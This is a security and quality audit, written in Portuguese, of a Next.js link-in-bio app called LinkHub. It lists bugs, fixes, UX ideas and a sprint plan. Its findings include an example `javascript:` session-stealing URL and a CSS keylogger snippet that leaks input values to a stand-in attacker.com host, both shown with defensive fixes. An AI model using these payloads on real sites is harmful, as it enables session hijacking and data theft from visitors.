# LinkHub — Auditoria End-to-End

**Método:** análise estática de código (106 arquivos TS), execução do compilador
TypeScript, grep de padrões de segurança, leitura de actions e rotas API.
**Não executei** o navegador nem simulei cliques.
**Data:** 2026-04-17 · TypeScript: ✅ 0 erros.

---

## ✅ Resumo Geral

**Estado geral: Bom** — MVP robusto e ambicioso, mas com **vazamentos de segurança
gritantes** que precisam ser fechados antes de produção real (fora uso
beta-fechado).

### Principais falhas encontradas
1. 🚨 **URL de link sem validação de protocolo** — permite `javascript:` → XSS nos
   visitantes
2. 🚨 **Custom CSS/JS sem sandboxing** — pode ser usado pra phishing
3. 🚨 **Zero rate limiting** em todas as APIs públicas
4. ⚠️ **Feature "Custom domain" incompleta** — schema e middleware existem, UI
   nunca foi construída
5. ⚠️ **Sem moderação** de templates publicados pela comunidade

### Pontos fortes
- Drizzle ORM parametrizado (sem SQL injection)
- Todas rotas protegidas chamam `auth.api.getSession`
- Slug validation centralizada com 38 reserved words
- Zod schemas na maioria dos inputs críticos
- Feature set amplo: 24 temas, 50+ templates, 16 paletas, 16 blocos, analytics,
  encurtador, QR, pixels, health check, backup, export HTML/CSV, import Linktree

---

## 🚨 Bugs Críticos

### 1. XSS via URL `javascript:` em blocos link
**Onde:** [src/app/dashboard/pages/actions.ts:302](src/app/dashboard/pages/actions.ts) — `defaultData.link` + toda escrita de bloco link via `updateBlock`
**Passo a passo:**
1. User edita bloco link, coloca URL `javascript:fetch('/steal-session')`
2. `updateBlock(blockId, data)` — não valida protocolo
3. URL é salva como-está
4. Qualquer visitante que clica → executa o JS no contexto do domínio

**Esperado:** rejeitar ou sanitizar qualquer URL que não seja `http(s)://`, `mailto:` ou `tel:`
**Atual:** aceita qualquer string
**Gravidade:** 🔴 Alta — vector de session hijacking
**Fix técnico:** no `updateBlock`:
```ts
if (data.kind === "link") {
  const url = data.url.trim();
  if (url && !/^(https?:\/\/|mailto:|tel:|wa\.me\/)/i.test(url)) {
    return { error: "URL precisa começar com http://, https://, mailto: ou tel:" };
  }
}
```
Aplicar também em `image.href`, `image.url`, `whatsapp.phone` (só dígitos),
`music.url`, `social-embed.url`, `products[].url`, `events[].url`.

---

### 2. Custom JS custom pode ser usado pra phishing
**Onde:** [src/app/[slug]/page.tsx](src/app/[slug]/page.tsx), [src/app/__custom/[domain]/page.tsx](src/app/__custom/[domain]/page.tsx)
**Passo a passo:**
1. User A configura `customJs` com script que sobrepõe formulário com fake login
2. Visitante da página de A insere credenciais no fake → dados vão pro A
**Esperado:** bloquear execução OU gate atrás de plano pago verificado (KYC) OU rodar em iframe sandbox
**Atual:** injeta direto via `<script defer>` no DOM principal
**Gravidade:** 🔴 Alta
**Fix:**
- Curto prazo: gate `customJs` em plano pago (`plans.ts` já tem estrutura)
- Médio prazo: rodar o bloco em `<iframe sandbox="allow-scripts">`
- Documentar claramente a responsabilidade do usuário

---

### 3. Zero rate limiting nas APIs públicas
**Onde:** `/api/track`, `/api/newsletter`, `/api/form-submit`, `/api/report-abuse`, `/api/slug-check`, `/api/upload`, `/api/realtime`
**Passo a passo:**
1. Atacante roda script POST em `/api/track` 1000 req/s
2. Inflaciona analytics de concorrente (ou zera performance)
3. Mesmo vetor em `/api/newsletter` → spam de emails falsos
4. `/api/upload` → enche Supabase Storage do owner

**Esperado:** rate limit por IP (ex: 10 req/s no track, 3 req/min no newsletter)
**Atual:** nenhuma proteção
**Gravidade:** 🔴 Alta (custo + denial of service)
**Fix:** Upstash Redis + `@upstash/ratelimit`. Middleware compartilhado que aplica limits diferentes por rota.

---

### 4. Custom CSS pode exfiltrar dados via `url()` + selectors
**Onde:** mesmo lugar do #2
**Exemplo:**
```css
input[value^="a"] { background: url(https://attacker.com/a); }
input[value^="b"] { background: url(https://attacker.com/b); }
/* ... */
```
Cada request revela 1 char do valor do input (ataque clássico CSS keylogger).
**Mitigação real:** limitar CSS permitido OU usar CSP `style-src` rigoroso.
**Gravidade:** 🟡 Média-Alta (precisa motivação + conhecimento)

---

## ⚠️ Bugs Médios

### 5. Custom domain — UI inexistente
**Onde:** schema tem `customDomain`, middleware faz rewrite, rota `/__custom/[domain]` existe, mas **`grep "customDomain" src/app/dashboard/` retorna vazio**
**Gravidade:** 🟡 Média (feature anunciada na landing que não existe)
**Fix:** form em `/dashboard/pages/[id]/edit` → aba Página, com input de domínio + botão "Verificar DNS" que faz lookup do CNAME.

### 6. Templates publicados sem moderação
**Onde:** `publishAsTemplate` action → aparece direto na galeria
**Risco:** conteúdo impróprio, palavrões, spam
**Fix:** campo `published: false` por padrão → admin review → `published: true`. Por ora, usa `published: true` automático.

### 7. Email verification **opcional** no env
**Onde:** [src/lib/auth.ts:13](src/lib/auth.ts) — `requireEmailVerification` só ativa se `EMAIL_VERIFICATION === "required"`
**Risco:** em produção sem essa env, qualquer email vale → contas fake, spam de signup
**Fix:** default `true` em produção; testar com Resend obrigatório.

### 8. `deleteAccount` não limpa Stripe
**Onde:** [src/app/dashboard/account/actions.ts](src/app/dashboard/account/actions.ts)
**Passo:** user com assinatura Pro → Deleta conta → tabela cascade → subscription row sumiu. Mas **Stripe customer ainda é cobrado** mensal.
**Fix:** antes do delete, chamar `stripe.subscriptions.cancel()` + `stripe.customers.del()`.

### 9. OG image sem cache control explícito
**Onde:** [src/app/[slug]/opengraph-image.tsx](src/app/[slug]/opengraph-image.tsx)
**Risco:** a cada request de meta scrape, regera PNG (Facebook crawl pode ser frequente)
**Fix:** usar `revalidate = 3600` na export ou headers com `Cache-Control: public, max-age=3600`.

### 10. `showAvatarPlaceholder` só no preview
**Onde:** [src/components/themed-page.tsx](src/components/themed-page.tsx) + consumers
Se usuário criar página sem avatar, público não vê círculo — OK pelo seu pedido anterior ("opcional"). Mas inconsistente: preview mostra placeholder, público não. Pode confundir.
**Fix:** documentar ou unificar.

### 11. Empty states em blocos dinâmicos
**Onde:** image/music/social-embed/events mostram empty state decente. Mas **form block sem fields** renderiza form vazio com só botão.
**Fix:** se `data.fields.length === 0`, mostrar empty state "Adicione campos no editor" no público.

### 12. Fontes: 12 arquivos carregados em TODA página
**Onde:** [src/app/layout.tsx](src/app/layout.tsx) — `allFontVariables` aplica as 12 variáveis no `<html>` de toda rota
**Impacto:** ~250kb extra no public page. Mobile brasileiro 3G sofre.
**Fix:** fontes custom só na rota `/[slug]` e `/__custom/[domain]` (usadas lá), dashboard usa só Inter.

### 13. Sem sitemap.xml ou robots.txt
**Onde:** raiz do app
**Impacto:** Google não indexa páginas de usuário eficientemente
**Fix:** criar `app/sitemap.ts` gerando todas as páginas publicadas.

---

## 🟢 Melhorias de UI/UX

### Editor
- **3-col layout só desktop** — mobile perde preview. Adicionar tab "Preview" no mobile.
- **Tabs de sidebar** viram overflow horizontal quando tem muita aba. `grid-cols-5` pode cortar em sm.
- **BlockStyleEditor** é colapsável mas empilha muito — considerar reduzir default de campos visíveis.
- **Drag-and-drop** bom mas falta indicador de "solte aqui" entre blocos.

### Dashboard
- Sem **busca/filtro** nas páginas (útil quando user tem 10+)
- Sem **ordenação custom** — ordem é só `updatedAt DESC`
- Cards têm aspect-ratio mas **scroll horizontal leve em mobile** pode ocorrer

### Analytics
- **Período fixo 30 dias** — sem seletor custom (7/30/90/1 ano)
- Sem **comparação período anterior** ("vs mês passado +12%")
- Sem **funil visual** (visitas → cliques → conversão)

### Onboarding
- **6 steps** — pode ser longo. Adicionar indicador "1 de 6" mais visível.
- **Skip** leva a dashboard vazio — considerar criar página em branco mesmo com skip.

### Copy
- "Publicar modelo" — **o que** é publicado (sem avatar/links/title)? Texto do modal explica mas poderia ser título mais direto.
- Mensagens de erro genéricas ("Dados inválidos") — trocar por específicas.

### Acessibilidade
- Muitos `<button>` sem `aria-label` (ex: botões de ícone só)
- `focus-visible:ring-2` aplicado na maioria mas não em tudo
- Contraste: em temas escuros, `mutedForeground` pode ficar abaixo de 4.5:1

---

## 🔥 Melhorias Premium (ideias de recurso)

### Monetização direta (gera receita pro user)
- **Pix checkout** no bloco produtos (fee % sobre GMV)
- **Gorjetas** (tip jar)
- **Agendamento pago** (Calendly-like com Pix)

### IA (diferencial)
- **Gerar página a partir do Insta** — scrape profile + IA gera bio/blocos
- **Otimizador** — IA lê analytics e sugere reordenar

### Growth
- **A/B testing** nativo (duas versões da página 50/50, ganha a de maior CTR)
- **Expiração de link** (vira 404 em data X)
- **Password-protected link** (senha pra visitar)
- **Link routing inteligente** (mesmo link abre destino diferente por país/device)
- **UTM auto nos próprios shortlinks** (além do que tem nos links da bio)

### Multi-página / colaboração
- **Team members** — várias contas editam mesma página
- **Workspaces agências** — conta-mãe gerencia N clientes
- **Brand kit** — cores/fontes travadas pra consistência

### Enterprise
- **Custom domains com certificado automático** (completar a feature)
- **API pública + webhooks** (novos assinantes newsletter)
- **White-label**

---

## ⚡ Performance e SEO

### Problemas encontrados
1. **12 fontes carregadas globalmente** (~250kb) — dashboard e páginas internas não precisam da maioria
2. **`next/image` não usado** — `<img>` cru em todo lugar, sem lazy loading otimizado nem formatos modernos
3. **Imagens grandes (até 5MB)** sem compressão server-side
4. **Falta `sitemap.xml` e `robots.txt`**
5. **Canonical URL não declarada** nas metas da página pública
6. **`opengraph-image` sem cache control** — regera por request
7. **`PagePreviewCard`** no dashboard renderiza N `ThemedPage` completos — com 50 páginas fica pesado

### Otimizações
- Fontes lazy via layout específico (`/(public)/layout.tsx`)
- Trocar `<img>` por `<Image>` nos lugares controlados (não user-content)
- Compressão server-side no upload (sharp)
- Gerar sitemap dinâmico
- Cache da OG image `revalidate = 3600`
- `loading="lazy"` em todos `<img>` (não-crítico)
- Dashboard: limitar preview cards a N visíveis, lazy render restantes

---

## 🛡️ Segurança — falhas e correções

| Falha | Impacto | Correção |
|---|---|---|
| URL sem validação de protocolo | XSS via `javascript:` | Whitelist protocolos em block actions |
| Custom JS livre | Phishing em visitantes | Gate em plano pago + iframe sandbox |
| Sem rate limit | Spam/DoS | Upstash Redis |
| Sem email verify default | Contas fake | EMAIL_VERIFICATION=required em prod |
| CSS arbitrário | Keylogger via CSS | CSP `style-src` rigoroso |
| Template sem moderação | Conteúdo impróprio | Flag + admin review |
| Delete account sem cancelar Stripe | Cobrança fantasma | `stripe.subscriptions.cancel()` no delete |
| Sem CSRF específico em forms públicos (`/api/newsletter`) | Cross-site spam | Token por página ou origin check |
| Webhook Stripe OK | — | Mantém |

### Boas práticas já implementadas ✅
- Drizzle parametriza queries
- Auth em todas rotas privadas
- Passwords hasheadas pelo Better Auth
- Cookies HttpOnly/Secure (Better Auth default)
- Server actions têm proteção CSRF nativa do Next

---

## 📋 Checklist Final

| Área | Testado via | Status |
|---|---|---|
| Cadastro/Login | Leitura de código (Better Auth) | ✅ Implementado, verify opcional |
| Dashboard | Código | ✅ Implementado |
| Editor de Links | Código + schema | ✅ Implementado (faltam validações URL) |
| Página Pública | Código + schema | ✅ Renderiza, XSS risk não corrigido |
| Personalização | Código (24 temas, 16 paletas, per-block) | ✅ Implementado |
| Responsividade | Inspeção de classes Tailwind | ⚠️ Mobile editor perde preview |
| Performance | Inspeção de imports | ⚠️ Fontes pesadas, imagens não otimizadas |
| Segurança | Grep de padrões | 🔴 XSS + rate limit pendentes |
| Planos Premium | Código (Stripe scaffold) | ✅ Scaffold pronto, precisa env |
| Analytics | Código (goals, cohort, heatmap) | ✅ Bem completo |

---

## 🏆 Priorização sugerida (próxima sprint)

### 🔥 Semana 1 (bloqueadores de produção)
1. **[1h]** Validação de protocolo em URL de blocos (fix #1)
2. **[2h]** Rate limit em /api/track, /api/newsletter, /api/form-submit (Upstash)
3. **[2h]** UI de custom domain (completar feature anunciada)
4. **[1h]** Sitemap.xml dinâmico + robots.txt
5. **[1h]** Force email verification em produção (mudar default)

### 🟡 Semana 2 (polimento)
6. **[4h]** Gate custom JS em plano Pro + iframe sandbox
7. **[3h]** Compressão de imagem no upload (sharp)
8. **[2h]** Fontes lazy — split layouts (public vs dashboard)
9. **[2h]** Moderação de templates (flag `approved`)
10. **[3h]** Mobile editor: tab Preview

### 🟢 Quando tiver tempo
11. Busca/filtro no dashboard
12. Analytics com seletor de período custom
13. A/B testing
14. Dashboard de stats agregados cross-page

---

## Score (subjetivo, baseado em código)

| Área | Nota |
|---|---|
| **Funcionalidade** | 9/10 — muito amplo |
| **Visual/UX** | 8.5/10 — iOS glass consistente |
| **Segurança** | 5/10 — lacunas sérias |
| **Performance** | 6/10 — otimizações pendentes |
| **Acessibilidade** | 6/10 — básico OK, falta aria |
| **Código** | 8/10 — TS limpo, modular, escalável |

**Nota geral: 7.2/10** — grande demo/beta fechado. Com os 5 itens de semana 1
corrigidos, vai pra **8.5/10** e pode ir pro ar em produção.
